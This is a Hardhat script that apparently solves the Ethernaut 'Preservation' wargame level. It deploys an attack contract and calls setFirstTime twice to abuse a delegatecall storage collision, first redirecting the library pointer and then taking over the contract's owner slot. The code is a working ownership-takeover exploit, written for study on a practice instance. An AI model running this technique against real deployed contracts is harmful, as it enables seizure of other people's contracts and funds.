const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Preservation");
  const victim = await Victim.attach(
    "0xB2890852059c51b5F2E442fE4955b53c659d59FE" // This is the contract address that you get from starting your instance
  );

  // Check to what address timeZone1Library is pointing, we must change it our attack contract address
  const value1 = await victim.timeZone1Library();
  console.log("timeZone1Library is pointing to ", value1);
  // Also check who the owner is
  const owner1 = await victim.owner();
  console.log("The initial owner is ", owner1);

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("PreservationAttack");

  // Deploy contract
  const contract = await MyContract.deploy();
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // First change the address to which timeZone1Library is pointing
  const attack1 = await victim.setFirstTime(contract.address);
  await attack1.wait(1);

  // Verify that the address has changed
  const value2 = await victim.timeZone1Library();
  console.log("timeZone1Library is now pointing to ", value2);

  // Finally, call again setFirstTime since now that is pointing to our attack contract will modify the owner
  // This is since we will modify the correct storage slot
  const options = { gasLimit: 100000 }; // to not get gas error
  const attack2 = await victim.setFirstTime(1, options); // you can pass as an argument whatever you like
  await attack2.wait(1);

  // Verify that you are now the owner
  const owner2 = await victim.owner();
  console.log("The final owner is ", owner2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
